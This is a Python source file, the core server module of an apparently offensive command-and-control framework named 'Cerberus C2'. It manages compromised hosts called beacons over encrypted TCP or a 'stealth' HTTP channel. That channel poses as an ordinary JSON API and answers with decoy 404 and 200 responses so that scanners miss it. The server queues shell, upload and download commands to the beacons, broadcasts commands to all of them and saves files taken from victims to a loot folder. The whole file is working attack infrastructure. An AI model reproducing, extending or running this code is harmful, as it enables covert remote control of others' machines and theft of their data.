"""Cerberus C2 core — multi-session async TCP + optional AES-GCM.

Protocol:
  4-byte big-endian length + body
  body = JSON bytes  (cleartext mode)
      or 12-byte nonce || AES-GCM(ciphertext)  (when key is set)

Message shape:
  {
    "id": "<beacon_id>",
    "type": "checkin|result|shell|upload|download|sleep|exit|ls|cat|ps|env|pwd|...",
    "data": { ... }
  }
"""

from __future__ import annotations

import asyncio
import base64
import struct
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import orjson

from cerberus.core.crypto import decrypt, derive_key, encrypt


def _pack(msg: dict, key: bytes | None = None) -> bytes:
    body = orjson.dumps(msg)
    if key:
        body = encrypt(key, body)
    return struct.pack(">I", len(body)) + body


async def _read_msg(reader: asyncio.StreamReader, key: bytes | None = None) -> dict | None:
    hdr = await reader.readexactly(4)
    (length,) = struct.unpack(">I", hdr)
    if length > 16 * 1024 * 1024:
        return None
    body = await reader.readexactly(length)
    if key:
        try:
            body = decrypt(key, body)
        except Exception:
            return None
    return orjson.loads(body)


@dataclass
class Beacon:
    id: str
    remote: str
    hostname: str = ""
    os: str = ""
    user: str = ""
    pid: int = 0
    cwd: str = ""
    label: str = ""
    notes: str = ""
    last_seen: float = field(default_factory=time.time)
    first_seen: float = field(default_factory=time.time)
    writer: asyncio.StreamWriter | None = None
    pending: asyncio.Queue = field(default_factory=asyncio.Queue)
    results: list[dict] = field(default_factory=list)
    jobs: list[dict] = field(default_factory=list)  # history of tasked commands

    def touch(self) -> None:
        self.last_seen = time.time()

    @property
    def connected(self) -> bool:
        return self.writer is not None and not self.writer.is_closing()


class C2Server:
    """In-process multi-session C2 server."""

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8443,
        loot_dir: Path | None = None,
        secret: str | None = None,
    ) -> None:
        self.host = host
        self.port = port
        self.loot_dir = loot_dir or Path("sessions/loot")
        self.loot_dir.mkdir(parents=True, exist_ok=True)
        self.key: bytes | None = derive_key(secret) if secret else None
        self.beacons: dict[str, Beacon] = {}
        self.active_id: str | None = None  # "interact" focus
        self._server: asyncio.Server | None = None
        self._task: asyncio.Task | None = None
        self.running = False

    async def start(self) -> None:
        if self.running:
            return
        self._server = await asyncio.start_server(self._handle_any, self.host, self.port)
        self.running = True
        self._task = asyncio.create_task(self._serve())

    async def _handle_any(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        """Dispatch TCP binary C2 vs HTTP beacon on the same port."""
        try:
            peek = await reader.readexactly(4)
        except asyncio.IncompleteReadError:
            writer.close()
            return
        # HTTP methods start with letters; binary length-prefix often has high bytes / small lengths
        if peek in (b"POST", b"GET ", b"HEAD", b"PUT ", b"OPTI"):
            await self._handle_http(reader, writer, peek)
        else:
            # push bytes back by prepending via a wrapper buffer
            await self._handle(reader, writer, preamble=peek)


    async def _serve(self) -> None:
        assert self._server is not None
        async with self._server:
            await self._server.serve_forever()

    async def stop(self) -> None:
        self.running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        for b in list(self.beacons.values()):
            if b.writer:
                try:
                    b.writer.close()
                    await b.writer.wait_closed()
                except Exception:
                    pass

    async def _handle_http(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        preamble: bytes,
    ) -> None:
        """Stealth HTTP beacon — benign URIs, JSON-wrapped AES blob, realistic headers."""
        from cerberus.core.http_stealth import (
            build_response,
            path_allowed,
            unwrap_c2_blob,
            wrap_c2_blob,
            SESSION_COOKIE,
        )

        try:
            rest = await reader.read(65536)
            raw = preamble + rest
            if b"\r\n\r\n" not in raw:
                writer.write(build_response(400, b""))
                await writer.drain()
                return
            header_blob, body = raw.split(b"\r\n\r\n", 1)
            header_lines = header_blob.split(b"\r\n")
            req_line = header_lines[0].decode(errors="ignore")
            parts = req_line.split()
            method = parts[0] if parts else ""
            path = parts[1] if len(parts) > 1 else "/"

            headers: dict[str, str] = {}
            for line in header_lines[1:]:
                if b":" in line:
                    k, v = line.split(b":", 1)
                    headers[k.decode(errors="ignore").lower().strip()] = v.decode(errors="ignore").strip()

            if "content-length" in headers:
                try:
                    need = int(headers["content-length"])
                    while len(body) < need:
                        body += await reader.read(need - len(body))
                except Exception:
                    pass

            # Non-POST or unknown path → look like a normal 404 JSON API
            if method != "POST" or not path_allowed(path):
                writer.write(build_response(404, b'{"error":"not_found"}'))
                await writer.drain()
                return

            # Prefer Cookie sid= as beacon id hint
            cookie = headers.get("cookie", "")
            cookie_sid = ""
            for part in cookie.split(";"):
                part = part.strip()
                if part.startswith(SESSION_COOKIE + "="):
                    cookie_sid = part.split("=", 1)[1].strip()

            blob = unwrap_c2_blob(body)
            msg = None
            if blob is not None:
                # blob may be length-prefixed encrypted frame or raw JSON
                payload = blob
                if len(blob) >= 4:
                    try:
                        (length,) = struct.unpack(">I", blob[:4])
                        if length + 4 <= len(blob):
                            payload = blob[4 : 4 + length]
                    except Exception:
                        pass
                if self.key:
                    try:
                        payload = decrypt(self.key, payload)
                    except Exception:
                        # maybe unencrypted JSON
                        pass
                try:
                    msg = orjson.loads(payload)
                except Exception:
                    msg = None

            if not msg:
                # still return 200 OK empty to avoid signalling C2 to scanners
                writer.write(build_response(200, b'{"status":"ok","data":null}'))
                await writer.drain()
                return

            peer = writer.get_extra_info("peername")
            remote = f"{peer[0]}:{peer[1]}" if peer else "unknown"
            bid = msg.get("id") or cookie_sid or str(uuid.uuid4())
            mtype = msg.get("type")
            data = msg.get("data") or {}

            if mtype == "checkin":
                if bid not in self.beacons:
                    self.beacons[bid] = Beacon(
                        id=bid,
                        remote=remote,
                        hostname=str(data.get("hostname", "")),
                        os=str(data.get("os", "")),
                        user=str(data.get("user", "")),
                        pid=int(data.get("pid", 0) or 0),
                        cwd=str(data.get("cwd", "")),
                    )
                    if self.active_id is None:
                        self.active_id = bid
                else:
                    b = self.beacons[bid]
                    b.touch()
                    b.remote = remote
                    for field_name in ("hostname", "os", "user", "cwd"):
                        if data.get(field_name):
                            setattr(b, field_name, str(data[field_name]))
                pending = []
                b = self.beacons[bid]
                while not b.pending.empty():
                    pending.append(await b.pending.get())
                out_msg = {"id": bid, "type": "batch", "data": {"cmds": pending}}
                out_body = orjson.dumps(out_msg)
                if self.key:
                    out_body = encrypt(self.key, out_body)
                frame = struct.pack(">I", len(out_body)) + out_body
                wrapped = wrap_c2_blob(frame)
                writer.write(build_response(200, wrapped))
                await writer.drain()
            elif mtype == "result" and bid in self.beacons:
                self.beacons[bid].touch()
                self.beacons[bid].results.append(data)
                if data.get("cwd"):
                    self.beacons[bid].cwd = str(data["cwd"])
                writer.write(build_response(200, b'{"status":"ok","data":{"ack":true}}'))
                await writer.drain()
            else:
                writer.write(build_response(200, b'{"status":"ok","data":null}'))
                await writer.drain()
        except Exception:
            try:
                writer.write(build_response(200, b'{"status":"ok","data":null}'))
                await writer.drain()
            except Exception:
                pass
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def _handle(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        preamble: bytes | None = None,
    ) -> None:
        peer = writer.get_extra_info("peername")
        remote = f"{peer[0]}:{peer[1]}" if peer else "unknown"
        beacon: Beacon | None = None

        # If we consumed a length-prefix preamble, handle first message specially
        first_buf = preamble or b""

        try:
            while True:
                if first_buf is not None and len(first_buf) == 4:
                    (length,) = struct.unpack(">I", first_buf)
                    first_buf = None  # type: ignore
                    if length > 16 * 1024 * 1024:
                        break
                    body = await reader.readexactly(length)
                    if self.key:
                        try:
                            body = decrypt(self.key, body)
                        except Exception:
                            break
                    msg = orjson.loads(body)
                else:
                    msg = await _read_msg(reader, self.key)
                if msg is None:
                    break

                mtype = msg.get("type")
                bid = msg.get("id") or str(uuid.uuid4())

                if mtype == "checkin":
                    data = msg.get("data") or {}
                    if bid not in self.beacons:
                        beacon = Beacon(
                            id=bid,
                            remote=remote,
                            hostname=str(data.get("hostname", "")),
                            os=str(data.get("os", "")),
                            user=str(data.get("user", "")),
                            pid=int(data.get("pid", 0) or 0),
                            cwd=str(data.get("cwd", "")),
                            writer=writer,
                        )
                        self.beacons[bid] = beacon
                        if self.active_id is None:
                            self.active_id = bid
                    else:
                        beacon = self.beacons[bid]
                        beacon.writer = writer
                        beacon.remote = remote
                        beacon.touch()
                        for field_name in ("hostname", "os", "user", "cwd"):
                            if data.get(field_name):
                                setattr(beacon, field_name, str(data[field_name]))
                        if data.get("pid"):
                            beacon.pid = int(data["pid"])

                    while not beacon.pending.empty():
                        cmd = await beacon.pending.get()
                        writer.write(_pack(cmd, self.key))
                        await writer.drain()

                    writer.write(_pack({"id": bid, "type": "ack", "data": {}}, self.key))
                    await writer.drain()

                elif mtype == "result":
                    if bid in self.beacons:
                        beacon = self.beacons[bid]
                        beacon.touch()
                        data = msg.get("data") or {}
                        beacon.results.append(data)
                        if len(beacon.results) > 100:
                            beacon.results = beacon.results[-100:]
                        if data.get("cwd"):
                            beacon.cwd = str(data["cwd"])

                elif mtype == "upload":
                    data = msg.get("data") or {}
                    name = data.get("name", f"loot_{bid}_{int(time.time())}")
                    # sanitize filename
                    name = Path(str(name)).name
                    content_b64 = data.get("content", "")
                    try:
                        raw = base64.b64decode(content_b64)
                        dest_dir = self.loot_dir / bid
                        dest_dir.mkdir(parents=True, exist_ok=True)
                        path = dest_dir / name
                        path.write_bytes(raw)
                        if bid in self.beacons:
                            self.beacons[bid].results.append(
                                {"cmd": "upload", "path": str(path), "size": len(raw)}
                            )
                            self.beacons[bid].touch()
                    except Exception as e:
                        if bid in self.beacons:
                            self.beacons[bid].results.append({"cmd": "upload", "error": str(e)})

                else:
                    if bid in self.beacons:
                        self.beacons[bid].touch()

        except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
            pass
        except Exception:
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            if beacon and beacon.id in self.beacons:
                self.beacons[beacon.id].writer = None

    async def task(self, beacon_id: str, mtype: str, data: dict | None = None) -> bool:
        beacon = self.beacons.get(beacon_id)
        if not beacon:
            return False
        msg = {"id": beacon_id, "type": mtype, "data": data or {}}
        beacon.jobs.append({"type": mtype, "data": data or {}, "ts": time.time()})
        if len(beacon.jobs) > 200:
            beacon.jobs = beacon.jobs[-200:]
        if beacon.connected:
            try:
                beacon.writer.write(_pack(msg, self.key))  # type: ignore
                await beacon.writer.drain()  # type: ignore
                return True
            except Exception:
                pass
        await beacon.pending.put(msg)
        return True

    async def broadcast(self, mtype: str, data: dict | None = None) -> int:
        """Send a command to every known beacon. Returns count tasked."""
        n = 0
        for bid in list(self.beacons.keys()):
            if await self.task(bid, mtype, data):
                n += 1
        return n

    def interact(self, beacon_id: str) -> bool:
        if beacon_id not in self.beacons:
            return False
        self.active_id = beacon_id
        return True

    def set_label(self, beacon_id: str, label: str) -> bool:
        b = self.beacons.get(beacon_id)
        if not b:
            return False
        b.label = label
        return True

    def set_notes(self, beacon_id: str, notes: str) -> bool:
        b = self.beacons.get(beacon_id)
        if not b:
            return False
        b.notes = notes
        return True

    def list_beacons(self) -> list[dict[str, Any]]:
        now = time.time()
        out = []
        for b in self.beacons.values():
            out.append({
                "id": b.id,
                "label": b.label,
                "remote": b.remote,
                "hostname": b.hostname,
                "os": b.os,
                "user": b.user,
                "pid": b.pid,
                "cwd": b.cwd,
                "last_seen": b.last_seen,
                "first_seen": b.first_seen,
                "age": round(now - b.last_seen, 1),
                "connected": b.connected,
                "pending": b.pending.qsize(),
                "results": len(b.results),
                "jobs": len(b.jobs),
                "notes": b.notes,
                "active": b.id == self.active_id,
            })
        out.sort(key=lambda x: (not x["connected"], x["age"]))
        return out

    def get_results(self, beacon_id: str, clear: bool = False) -> list[dict]:
        b = self.beacons.get(beacon_id)
        if not b:
            return []
        results = list(b.results)
        if clear:
            b.results.clear()
        return results

    def get_beacon(self, beacon_id: str) -> Beacon | None:
        return self.beacons.get(beacon_id)


_c2: C2Server | None = None


def get_c2() -> C2Server | None:
    return _c2


def set_c2(server: C2Server | None) -> None:
    global _c2
    _c2 = server
